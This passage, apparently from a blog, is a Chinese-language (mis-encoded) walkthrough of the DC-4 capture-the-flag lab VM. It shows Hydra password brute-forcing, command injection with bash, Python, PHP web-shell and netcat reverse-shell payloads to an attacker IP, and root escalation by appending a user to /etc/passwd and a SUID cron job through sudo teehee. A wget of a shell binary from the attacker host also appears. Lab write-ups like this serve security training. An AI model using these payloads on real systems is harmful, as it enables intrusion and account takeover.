waiting)) from a previous session found, to prevent overwriting, ./hydra.restore<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task<br>[DATA] attacking http-post-form://192.168.135.159:80/login.php:username=^USER^&amp;password=^PASS^:S=logout<br>[80][http-post-form] host: 192.168.135.159   login: admin   password: happy<br>1 of 1 target successfully completed, 1 valid password found<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-10 20:37:53<br></code></pre></td></tr></table></figure><p>å¾—åˆ°ï¼š<code>login: admin   password: happy</code> ï¼Œç™»é™†ï¼Œçœ‹åˆ°æœ‰ä¸ª <code>Command</code> ï¼Œè¿›å»åå‘ç°å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œä¸è¿‡åªèƒ½æ‰§è¡Œç‰¹å®šçš„å‘½ä»¤ã€‚</p><blockquote><p>å¯èƒ½éœ€è¦ç™»å½•ä¸¤æ¬¡ï¼Œä¸çŸ¥ä¸ºä½•ç¬¬ä¸€æ¬¡ç™»é™†ååªæ˜¯åˆ·æ–°äº†é¡µé¢</p></blockquote><h2 id="äºŒã€æƒé™è·å–"><a href="#äºŒã€æƒé™è·å–" class="headerlink" title="äºŒã€æƒé™è·å–"></a>äºŒã€æƒé™è·å–</h2><p>ä½¿ç”¨ burp æŠ“åŒ…ï¼ŒSend to Repeaterï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">POST /command.php HTTP/1.1<br>Host: 192.168.135.159<br>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 22<br>Origin: http://192.168.135.159<br>Connection: close<br>Referer: http://192.168.135.159/command.php<br>Cookie: PHPSESSID=cetjo47ie8r15re8h7qr32la17<br>Upgrade-Insecure-Requests: 1<br><br>radio=ls+-l&amp;submit=Run<br></code></pre></td></tr></table></figure><p>ä¿®æ”¹ POST æ•°æ®ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">radio=whoami&amp;submit=Run<br></code></pre></td></tr></table></figure><p>sendï¼ŒæˆåŠŸæ‰§è¡Œå‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">You have selected: whoami&lt;br /&gt;<br>&lt;pre&gt;<br>www-data<br>&lt;/pre&gt;<br></code></pre></td></tr></table></figure><p>å†æ¬¡ä¿®æ”¹ï¼Œåå¼¹ shellï¼Œç»è¿‡æµ‹è¯•ï¼Œbashã€python åå¼¹éƒ½æœªæˆåŠŸï¼Œå†™ä¸€å¥è¯æœ¨é©¬ä¹Ÿæ²¡æˆåŠŸï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">radio=bash -i &gt;&amp; /dev/tcp/192.168.135.141/4444 0&gt;&amp;1&amp;submit=Run<br>radio=import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.135.141&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])&amp;submit=Run<br>radio=echo &quot;&lt;?php $wzz=$_GET[&#x27;wzz&#x27;]; echo `$wzz`; ?&gt;&quot; &gt; shell.php&amp;submit=Run<br></code></pre></td></tr></table></figure><p>nc æˆåŠŸåå¼¹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">radio=nc -e /bin/sh 192.168.135.141 4444&amp;submit=Run<br></code></pre></td></tr></table></figure><p>kali ç›‘å¬ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 4444</span>                                                    <br>listening on [any] 4444 ...<br>connect to [192.168.135.141] from (UNKNOWN) [192.168.135.159] 59456<br>whoami<br>www-data<br>python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;<br>www-data@dc-4:/usr/share/nginx/html$ <br></code></pre></td></tr></table></figure><h2 id="ä¸‰ã€æƒé™æå‡"><a href="#ä¸‰ã€æƒé™æå‡" class="headerlink" title="ä¸‰ã€æƒé™æå‡"></a>ä¸‰ã€æƒé™æå‡</h2><p>åœ¨ jim ç”¨æˆ·ç›®å½•ä¸‹å‘ç°ä¸€äº›æ—§å¯†ç ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@dc-4:/usr/share/nginx/html$ ls /home<br>ls /home<br>charles  jim  sam<br>www-data@dc-4:/usr/share/nginx/html$ ls -l /home/charles<br>ls -l /home/charles<br>total 0<br>www-data@dc-4:/usr/share/nginx/html$ ls -l /home/sam<br>ls -l /home/sam<br>total 0<br>www-data@dc-4:/usr/share/nginx/html$ ls -l /home/jim    <br>ls -l /home/jim<br>total 12<br>drwxr-xr-x 2 jim jim 4096 Apr  7  2019 backups<br>-rw------- 1 jim jim  528 Apr  6  2019 mbox<br>-rwsrwxrwx 1 jim jim  174 Apr  6  2019 test.sh<br>www-data@dc-4:/usr/share/nginx/html$ ls -l /home/jim/backups<br>ls -l /home/jim/backups<br>total 4<br>-rw-r--r-- 1 jim jim 2047 Apr  7  2019 old-passwords.bak<br>www-data@dc-4:/usr/share/nginx/html$ cat /home/jim/backups/old-passwords.bak<br>cat /home/jim/backups/old-passwords.bak<br>000000<br>12345<br>iloveyou<br>[......]<br></code></pre></td></tr></table></figure><p>hydra çˆ†ç ´ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> hydra -l jim -P passwd.txt 192.168.135.159 ssh</span><br>Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-10 23:29:09<br>[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 252 login tries (l:1/p:252), ~16 tries per task<br>[DATA] attacking ssh://192.168.135.159:22/<br>[STATUS] 179.00 tries/min, 179 tries in 00:01h, 76 to do in 00:01h, 16 active<br>[22][ssh] host: 192.168.135.159   login: jim   password: jibril04<br>1 of 1 target successfully completed, 1 valid password found<br>[WARNING] Writing restore file because 4 final worker threads did not complete until end.<br>[ERROR] 4 targets did not resolve or could not be connected<br>[ERROR] 0 target did not complete<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-10 23:30:43<br></code></pre></td></tr></table></figure><p>å¾—åˆ° <code>login: jim   password: jibril04</code> ï¼Œç™»å½• SSHï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ssh jim@192.168.135.159</span><br>jim@192.168.135.159&#x27;s password: <br>Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686<br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms for each program are described in the<br>individual files in /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>You have mail.<br>Last login: Sun Apr  7 02:23:55 2019 from 192.168.0.100<br>jim@dc-4:/$<br></code></pre></td></tr></table></figure><p>çœ‹åˆ°æœ‰ä¸ªé‚®ä»¶ï¼ŒæŸ¥æ‰¾é‚®ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs shell">jim@dc-4:/$ find / -name mail 2&gt;/dev/null<br>/usr/bin/mail<br>/etc/alternatives/mail<br>/var/mail<br>/var/spool/mail<br>jim@dc-4:/$ ls -l /var/mail<br>total 8<br>-rw-rw---- 1 jim      mail  715 Apr  6  2019 jim<br>-rw-rw---- 1 www-data mail 1776 Jul 11 11:56 www-data<br>jim@dc-4:/$ cat /var/mail/jim<br>From charles@dc-4 Sat Apr 06 21:15:46 2019<br>Return-path: &lt;charles@dc-4&gt;<br>Envelope-to: jim@dc-4<br>Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000<br>Received: from charles by dc-4 with local (Exim 4.89)<br>        (envelope-from &lt;charles@dc-4&gt;)<br>        id 1hCjIX-0000kO-Qt<br>        for jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000<br>To: jim@dc-4<br>Subject: Holidays<br>MIME-Version: 1.0<br>Content-Type: text/plain; charset=&quot;UTF-8&quot;<br>Content-Transfer-Encoding: 8bit<br>Message-Id: &lt;E1hCjIX-0000kO-Qt@dc-4&gt;<br>From: Charles &lt;charles@dc-4&gt;<br>Date: Sat, 06 Apr 2019 21:15:45 +1000<br>Status: O<br>Hi Jim,<br>I&#x27;m heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.<br>Password is:  ^xHhA&amp;hvim0y<br>See ya,<br>Charles<br></code></pre></td></tr></table></figure><p> å¾—åˆ° <code>Charles</code> ç”¨æˆ·å¯†ç ï¼š<code>^xHhA&amp;hvim0y</code> ï¼Œåˆ‡æ¢åˆ° <code>Charles</code> ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">jim@dc-4:~$ su charles<br>Password: <br>charles@dc-4:/home/jim$ <br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹ sudoï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">charles@dc-4:/home/jim$ sudo -l<br>Matching Defaults entries for charles on dc-4:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User charles may run the following commands on dc-4:<br>    (root) NOPASSWD: /usr/bin/teehee<br></code></pre></td></tr></table></figure><p>å‘ç°å¯ä»¥æ— å¯†ç è¿è¡Œ teehee</p><p><strong>æ–¹æ³•ä¸€ï¼šåˆ›å»ºä¸€ä¸ª root æƒé™ç”¨æˆ·ï¼Œç”¨ teehee å¾€ /etc/passwd é‡Œæ·»åŠ ä¸€ä¸ª root æƒé™ç”¨æˆ·</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs shell">charles@dc-4:/home/jim$ echo &quot;test::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd<br>test::0:0:::/bin/bash<br>charles@dc-4:/home/jim$ su test<br>root@dc-4:/home/jim# whoami<br>root<br>root@dc-4:/home/jim# ls /root<br>flag.txt<br>root@dc-4:/home/jim# cat /root/flag.txt<br><br><br><br>888       888          888 888      8888888b.                             888 888 888 888 <br>888   o   888          888 888      888  &quot;Y88b                            888 888 888 888 <br>888  d8b  888          888 888      888    888                            888 888 888 888 <br>888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 <br>888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;&quot;88b 888 &quot;88b d8P  Y8b 888 888 888 888 <br>88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P <br>8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &quot;   &quot;   &quot;   &quot;  <br>888P     Y888  &quot;Y8888  888 888      8888888P&quot;   &quot;Y88P&quot;  888  888  &quot;Y8888  888 888 888 888 <br><br><br>Congratulations!!!<br><br>Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those<br>who have provided feedback, and who have taken time to complete these little<br>challenges.<br><br>If you enjoyed this CTF, send me a tweet via @DCAU7.<br></code></pre></td></tr></table></figure><p><strong>æ–¹æ³•äºŒï¼šåˆ›å»ºä¸€ä¸ªå®šæ—¶ä»»åŠ¡ï¼Œç»™ /bin/sh èµ‹äºˆ SUID æƒé™ï¼Œç”¨ teehee æŠŠå®šæ—¶ä»»åŠ¡å†™åˆ°å®šæ—¶ä»»åŠ¡æ–‡ä»¶ /etc/crontab</strong></p><blockquote><p>bash ä¸å¯ä»¥ï¼Œsh å¯ä»¥</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs shell">charles@dc-4:/home/jim$ echo &quot;* * * * * root chmod u+s /bin/bash&quot; | sudo teehee -a /etc/crontab<br>* * * * * root chmod 4777 /bin/bash<br>charles@dc-4:/home/jim$ cat /etc/crontab<br><span class="hljs-meta">#</span><span class="bash"> /etc/crontab: system-wide crontab</span><br><span class="hljs-meta">#</span><span class="bash"> Unlike any other crontab you don<span class="hljs-string">&#x27;t have to run the `crontab&#x27;</span></span><br><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">command</span> to install the new version when you edit this file</span><br><span class="hljs-meta">#</span><span class="bash"> and files <span class="hljs-keyword">in</span> /etc/cron.d. These files also have username fields,</span><br><span class="hljs-meta">#</span><span class="bash"> that none of the other crontabs <span class="hljs-keyword">do</span>.</span><br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> m h dom mon dow user  <span class="hljs-built_in">command</span></span><br>17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )<br><span class="hljs-meta">#</span><span class="bash"></span><br><span class="bash">* * * * * root chmod u+s /bin/bash</span><br>charles@dc-4:/home/jim$ ls -l /bin/bash<br>-rwsrwxrwx 1 root root 1265272 May 16  2017 /bin/bash<br>charles@dc-4:/home/jim$ /bin/bash<br>bash-4.4$ whoami<br>charles<br>bash-4.4$ exit<br><br>charles@dc-4:/home/jim$ echo &quot;* * * * * root chmod u+s /bin/sh&quot; | sudo teehee -a /etc/crontab<br>* * * * * root chmod u+s /bin/sh<br>charles@dc-4:/home/jim$ cat /etc/crontab<br><span class="hljs-meta">#</span><span class="bash"> /etc/crontab: system-wide crontab</span><br><span class="hljs-meta">#</span><span class="bash"> Unlike any other crontab you don<span class="hljs-string">&#x27;t have to run the `crontab&#x27;</span></span><br><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">command</span> to install the new version when you edit this file</span><br><span class="hljs-meta">#</span><span class="bash"> and files <span class="hljs-keyword">in</span> /etc/cron.d. These files also have username fields,</span><br><span class="hljs-meta">#</span><span class="bash"> that none of the other crontabs <span class="hljs-keyword">do</span>.</span><br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> m h dom mon dow user  <span class="hljs-built_in">command</span></span><br>17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )<br><span class="hljs-meta">#</span><span class="bash"></span><br><span class="bash">* * * * * root chmod u+s /bin/bash</span><br>* * * * * root chmod u+s /bin/sh<br>charles@dc-4:/home/jim$ ls -l /bin/sh<br>lrwxrwxrwx 1 root root 4 Jan 24  2017 /bin/sh -&gt; dash<br>charles@dc-4:/home/jim$ ls -l /bin/dash<br>-rwsr-xr-x 1 root root 124492 Jan 24  2017 /bin/dash<br>charles@dc-4:/home/jim$ /bin/sh<br><span class="hljs-meta">#</span><span class="bash"> whoami</span><br>root<br><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-variable">$0</span></span><br>/bin/sh<br><span class="hljs-meta">#</span><span class="bash"> </span><br></code></pre></td></tr></table></figure><h2 id="å››ã€æ€»ç»“"><a href="#å››ã€æ€»ç»“" class="headerlink" title="å››ã€æ€»ç»“"></a>å››ã€æ€»ç»“</h2><ol><li>web ç™»å½•é¡µçˆ†ç ´ï¼šç”¨æˆ·å admin</li><li>è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼šbashã€python åå¼¹å¤±è´¥ï¼Œä¸€å¥è¯æœ¨é©¬å†™å…¥å¤±è´¥ï¼Œnc åå¼¹æˆåŠŸ</li><li>æ—§å¯†ç æ³„éœ²ï¼Œhydra çˆ†ç ´ SSH</li><li>é‚®ä»¶æ³„éœ²ç”¨æˆ·å¯†ç </li><li>teehee ææƒï¼ˆsudo ææƒï¼‰ï¼šåˆ›å»º root æƒé™ç”¨æˆ·ï¼ˆsu ææƒï¼‰ã€åˆ›å»ºè®¡åˆ’ä»»åŠ¡ï¼ˆSUID ææƒï¼‰</li></ol><h2 id="äº”ã€Others"><a href="#äº”ã€Others" class="headerlink" title="äº”ã€Others"></a>äº”ã€Others</h2><p>å…·æœ‰ s æƒé™çš„ .sh æ–‡ä»¶ï¼Œå†™å…¥äºŒè¿›åˆ¶æ–‡ä»¶æ•°æ®å s æƒé™æ²¡æœ‰äº†ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 4444</span><br>listening on [any] 4444 ...<br>connect to [192.168.135.141] from (UNKNOWN) [192.168.135.159] 34116<br>python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;<br>www-data@dc-4:/usr/share/nginx/html$ cd /home/jim<br>cd /home/jim<br>www-data@dc-4:/home/jim$ ls -l<br>ls -l<br>total 12<br>drwxr-xr-x 2 jim jim 4096 Apr  7  2019 backups<br>-rw------- 1 jim jim  528 Apr  6  2019 mbox<br>-rwsrwxrwx 1 jim jim  174 Apr  6  2019 test.sh<br>www-data@dc-4:/home/jim$ ls -l / | grep tmp<br>ls -l / | grep tmp<br>drwxrwxrwt   8 root root  4096 Jul 12 07:14 tmp<br>www-data@dc-4:/home/jim$ wget http://192.168.135.141:8888/shell_32 /tmp<br>wget http://192.168.135.141:8888/shell_32 /tmp<br>--2022-07-12 07:16:47--  http://192.168.135.141:8888/shell_32<br>Connecting to 192.168.135.141:8888... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 15152 (15K) [application/octet-stream]<br>shell_32: Permission denied<br><br>Cannot write to &#x27;shell_32&#x27; (Permission denied).<br>/tmp: Scheme missing.<br>www-data@dc-4:/home/jim$ cd /tmp<br>cd /tmp<br>www-data@dc-4:/tmp$ wget http://192.168.135.141:8888/shell_32<br>wget http://192.168.135.141:8888/shell_32<br>--2022-07-12 07:18:16--  http://192.168.135.141:8888/shell_32<br>Connecting to 192.168.135.141:8888... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 15152 (15K) [application/octet-stream]<br>Saving to: &#x27;shell_32&#x27;<br><br>shell_32            100%[===================&gt;]  14.80K  --.-KB/s    in 0s      <br><br>2022-07-12 07:18:16 (168 MB/s) - &#x27;shell_32&#x27; saved [15152/15152]<br><br>www-data@dc-4:/tmp$ ls<br>ls<br>shell_32<br>systemd-private-3f7853ced3d74153bd9e92b584328615-systemd-timesyncd.service-3jUHwb<br>www-data@dc-4:/tmp$ cd /home/jim<br>cd /home/jim<br>www-data@dc-4:/home/jim$ ls -l<br>ls -l<br>total 12<br>drwxr-xr-x 2 jim jim 4096 Apr  7  2019 backups<br>-rw------- 1 jim jim  528 Apr  6  2019 mbox<br>-rwsrwxrwx 1 jim jim  174 Apr  6  2019 test.sh<br>www-data@dc-4:/home/jim$ cat /tmp/shell_32 &gt; test.sh<br>cat /tmp/shell_32 &gt; test.sh<br>www-data@dc-4:/home/jim$ ls -l<br>ls -l<br>total 24<br>drwxr-xr-x 2 jim jim  4096 Apr  7  2019 backups<br>-rw------- 1 jim jim   528 Apr  6  2019 mbox<br>-rwxrwxrwx 1 jim jim 15152 Jul 12 07:19 test.sh<br>www-data@dc-4:/home/jim$ <br></code></pre></td></tr></table></figure><p>å‘ç°åªè¦ä¿®æ”¹æ–‡ä»¶ s æƒé™å°±æ²¡äº†ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ls -l</span><br>total 12<br>drwxr-xr-x 2 jim jim 4096 Apr  7  2019 backups<br>-rw------- 1 jim jim  528 Apr  6  2019 mbox<br>-rwsrwxrwx 1 jim jim  174 Apr  6  2019 test.sh<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;/bin/bash&#x27;</span> &gt;&gt; test.sh</span><br><span class="hljs-meta">$</span><span class="bash"> ls -l</span><br>total 12<br>drwxr-xr-x 2 jim jim 4096 Apr  7  2019 backups<br>-rw------- 1 jim jim  528 Apr  6  2019 mbox<br>-rwxrwxrwx 1 jim jim  184 Jul 13 09:24 test.sh<br><span class="hljs-meta">$</span><span class="bash"> chmod u+s test.sh</span><br><span class="hljs-meta">$</span><span class="bash"> ls -l</span><br>total 12<br>drwxr-xr-x 2 jim jim 4096 Apr  7  2019 backups<br>-rw------- 1 jim jim  528 Apr  6  2019 mbox<br>-rwxrwxrwx 1 jim jim  184 Jul 13  2022 test.sh<br></code></pre></td></tr></table></figure><p>æ–‡ä»¶æ‹¥æœ‰è€…å¯ä»¥åŠ  s æƒé™ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">im@dc-4:~$ ls -l<br>total 12<br>drwxr-xr-x 2 jim jim 4096 Apr  7  2019 backups<br>-rw------- 1 jim jim  528 Apr  6  2019 mbox<br>-rwxrwxrwx 1 jim jim  184 Jul 13  2022 test.sh<br>jim@dc-4:~$ chmod u+s test.sh<br>jim@dc-4:~$ ls -l<br>total 12<br>drwxr-xr-x 2 jim jim 4096 Apr  7  2019 backups<br>-rw------- 1 jim jim  528 Apr  6  2019 mbox<br>-rwsrwxrwx 1 jim jim  184 Jul 13  2022 test.sh<br>jim@dc-4:~$ <br></code></pre></td></tr></table></figure><p>å‚è€ƒï¼š</p><p><a href="https://www.jb51.net/article/98188.htm">Linux 